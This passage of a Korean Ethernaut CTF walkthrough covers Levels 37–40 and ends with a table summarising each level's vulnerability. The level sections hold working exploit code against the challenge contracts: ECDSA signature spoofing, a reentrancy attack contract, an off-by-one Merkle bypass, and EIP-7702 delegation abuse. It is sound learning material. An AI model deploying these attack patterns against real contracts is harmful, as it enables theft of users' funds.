e = r · u1 · u2⁻¹ mod n   ← 이 값이 "amount" 역할

→ ECDSA.recover(bytes32(e), (r,s,v)) == Alice ✓
```

### 풀이 방법

```python
# EllipticToken.py 실행 → r, s, v, amount(e) 출력
python3 EllipticToken.py
```

```javascript
const ALICE = "0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e"

const spoofedAmount = "0x..."
const aliceSig = ethers.utils.solidityPack(['bytes32','bytes32','uint8'], [r, s, v])

const permitAcceptHash = ethers.utils.solidityKeccak256(
    ['address','address','uint256'], [ALICE, player, spoofedAmount]
)
const playerSigRaw = await signer._signingKey().signDigest(permitAcceptHash)
const playerSig = ethers.utils.solidityPack(
    ['bytes32','bytes32','uint8'],
    [playerSigRaw.r, playerSigRaw.s, playerSigRaw.v]
)

await contract.permit(spoofedAmount, player, aliceSig, playerSig)
await contract.transferFrom(ALICE, player, ethers.utils.parseEther("10"))
// Alice 잔액 = 0 ✓
```

---

## Level 38 — BetHouse

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | withdrawAll 재진입 공격 |
| **목표** | isBettor(player) == true |

### 문제 설명

`Pool.withdrawAll()`이 ETH 전송 후 토큰을 소각한다. `receive()` 콜백에서 PDT를 재예치하고, 잠금 후 `makeBet`을 호출할 수 있다.

### 취약한 실행 흐름

```
withdrawAll()
  → PDT 반환
  → ETH 전송 → receive() 콜백
      → pool.deposit(PDT)
      → pool.lockDeposits()
      → betHouse.makeBet(bettor) ✓
  → 래핑 토큰 소각 (타이밍 상 이미 늦음)
```

### 공격 컨트랙트

```solidity
contract BetHouseAttack {
    BetHouse target; Pool pool; PoolToken depositToken; address bettor;

    constructor(address t, address payable p, address d) payable {
        target = BetHouse(t); pool = Pool(p);
        depositToken = PoolToken(d); bettor = msg.sender;
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(bettor);
    }
}
```

```javascript
const pdtInst = new ethers.Contract(depositToken, ERC20_ABI, signer)
await pdtInst.transfer(attackAddr, 5)
await attackInst.attack({ value: ethers.utils.parseEther("0.001") })
// isBettor(player) = true ✓
```

---

## Level 39 — NotOptimisticPortal

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | off-by-one 루프, 실행 선행/검증 후행, L2 Merkle 증명 |
| **목표** | totalSupply() > 0 |

### 문제 설명

L2 브릿지를 모방한 컨트랙트. `_computeMessageSlot`이 마지막 원소를 해시에서 제외하는 off-by-one 버그가 있다. `executeMessage`는 작업을 실행한 후 Merkle 증명을 검증한다.

### 취약점

```solidity
// 마지막 원소가 해시 계산에서 빠짐!
for(uint i; i < _messageReceivers.length - 1; i++) { ... }

// 실행 후 검증
for(...) { _executeOperation(...); }  // 먼저 실행
_verifyMessageInclusion(...);          // 나중에 검증
```

### 풀이 방법

```javascript
const proofs = {
    stateTrieProof:   "0x...",
    storageTrieProof: "0x...",
    accountStateRlp:  "0x..."
}

await contract.executeMessage(player, 1, [], [], 0, proofs, 0)
// totalSupply = 1 > 0 ✓
```

---

## Level 40 — Cashback

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | EIP-7702 위임, 바이트코드 주소 임베딩, 트랜지언트 스토리지 |
| **목표** | 최대 캐시백 달성 + SuperCashbackNFT 2개 + EIP-7702 코드 보유 |

### 클리어 조건

```
✓ balanceOf(player, NATIVE) == 1 ether
✓ balanceOf(player, FREE)   == 500 ether
✓ SuperCashbackNFT 소유 (ownerOf == player)
✓ SuperCashbackNFT 잔액 >= 2
✓ player.code == EF0100 + instanceAddress
```

### 문제 설명

`onlyDelegatedToCashback` modifier가 코드 메모리 offset 23에서 20바이트를 읽어 instance 주소와 비교한다. 바이트코드의 3~22번 위치에 instance 주소를 임베딩한 공격 컨트랙트로 우회 가능하다.

### 바이트코드 구조

```
위치:  0    1    2  | 3 ~ 22          | 23 | 24 ~
코드: 60   17   56  | <instance addr> | 5B | <실제 로직>
      PUSH1 0x17 JUMP   주소 건너뜀    JD
```

### Phase 1 — 최대 캐시백 수령

```solidity
contract CashbackAttack {
    bool nonceOnce;

    function isUnlocked() public pure returns (bool) { return true; }

    function consumeNonce() external returns (uint256) {
        if (!nonceOnce) { nonceOnce = true; return 10000; }
        return 0;
    }

    function attack(Cashback cashback, IERC20 free, IERC721 nft, address recovery) external {
        cashback.accrueCashback(NATIVE, 200 ether);
        cashback.accrueCashback(FREE_CURRENCY, 25000 ether);
        cashback.safeTransferFrom(address(this), recovery, NATIVE_ID, 1 ether, "");
        cashback.safeTransferFrom(address(this), recovery, FREE_ID, 500 ether, "");
        nft.transferFrom(address(this), recovery, uint256(uint160(address(this))));
    }
}
```

### Phase 2 — EIP-7702로 두 번째 NFT 발행

```javascript
// Step 1: NonceSetter에 위임 → instance nonce = 9999
const auth1 = await signer.signAuthorization({ contractAddress: nonceSetterAddr })
await provider.send("eth_sendTransaction", [{
    from: player, authorizationList: [auth1],
    to: player,
    data: nonceSetter.interface.encodeFunctionData("setNonce", [9999])
}])

// Step 2: instance에 위임 → payWithCashback → nonce = 10000 → NFT 발행
const auth2 = await signer.signAuthorization({ contractAddress: instance.address })
await provider.send("eth_sendTransaction", [{
    from: player, authorizationList: [auth2],
    to: player,
    data: instance.interface.encodeFunctionData("payWithCashback", [
        "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
        player, 1
    ])
}])
// player.code = EF0100 + instance ✓
// SuperCashbackNFT 2개 ✓
```

---

## 전체 요약

| Level | 이름 | 핵심 취약점 | 난이도 |
|-------|------|-------------|--------|
| 0 | Hello Ethernaut | 기본 함수 호출 | * |
| 1 | Fallback | receive() fallback owner 탈취 | * |
| 2 | Fallout | 오타 생성자 | * |
| 3 | CoinFlip | 온체인 난수 예측 | ** |
| 4 | Telephone | tx.origin vs msg.sender | * |
| 5 | Token | 정수 언더플로우 | ** |
| 6 | Delegation | delegatecall fallback | ** |
| 7 | Force | selfdestruct 강제 전송 | ** |
| 8 | Vault | private 스토리지 직접 읽기 | ** |
| 9 | King | ETH 수신 거부 DoS | *** |
| 10 | Re-entrancy | 재진입 공격 | *** |
| 11 | Elevator | view 함수 상태 의존 | ** |
| 12 | Privacy | 스토리지 레이아웃 분석 | *** |
| 13 | Gatekeeper One | gas 조정 + bytes 마스킹 | **** |
| 14 | Gatekeeper Two | constructor extcodesize | *** |
| 15 | Naught Coin | ERC20 transferFrom 우회 | ** |
| 16 | Preservation | delegatecall 스토리지 충돌 | **** |
| 17 | Recovery | 컨트랙트 주소 파생 | ** |
| 18 | Magic Number | 순수 EVM 바이트코드 | *** |
| 19 | Alien Codex | 배열 언더플로우 전체 스토리지 | **** |
| 20 | Denial | 가스 고갈 DoS | *** |
| 21 | Shop | view 함수 두 번 다른 값 | *** |
| 22 | Dex | AMM 가격 조작 | *** |
| 23 | Dex Two | 가짜 토큰 swap | *** |
| 24 | Puzzle Wallet | Proxy 스토리지 충돌 + multicall | ***** |
| 25 | Motorbike | UUPS 미초기화 구현체 | **** |
| 26 | Double Entry Point | Forta DetectionBot 구현 | *** |
| 27 | Good Samaritan | 커스텀 에러 분기 유도 | *** |
| 28 | Gatekeeper Three | 다중 조건 우회 | *** |
| 29 | Switch | calldata 오프셋 조작 | **** |
| 30 | Higher Order | calldata 타입 범위 초과 | ** |
| 31 | Stake | ETH/WETH 회계 불일치 | *** |
| 32 | Impersonator | ECDSA 서명 가변성 (s→n-s) | **** |
| 33 | ImpersonatorTwo | ECDSA k 재사용 → 개인키 복구 | ***** |
| 34 | Forger | ECDSA 가변성으로 서명 재사용 | **** |
| 35 | MagicAnimalCarousel | XOR 저장 + NEXT_ID 오염 | **** |
| 36 | UniqueNFT | ERC721 콜백 재진입 + EIP-7702 | ***** |
| 37 | EllipticToken | 퍼블릭키만으로 서명 위조 | ***** |
| 38 | BetHouse | withdrawAll 재진입 | **** |
| 39 | NotOptimisticPortal | off-by-one + 실행 선행/검증 후행 | ***** |
| 40 | Cashback | EIP-7702 + 바이트코드 주소 임베딩 | ***** |
